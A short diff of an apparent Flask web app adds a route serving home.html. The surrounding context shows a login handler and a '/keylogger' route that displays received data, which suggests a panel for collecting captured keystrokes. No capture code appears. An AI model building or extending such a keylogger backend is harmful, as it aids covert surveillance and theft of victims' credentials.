@@ -150,7 +150,9 @@ def login():
         except Exception as e:
             return "Đã xảy ra lỗi: " + str(e)
     return render_template('login.html')
-
+@app.route('/home.html')
+def home():
+    return render_template('home.html')
 @app.route('/keylogger')
 def keylogger_router():
     return render_template('keylogger.html', data_received=data_received)
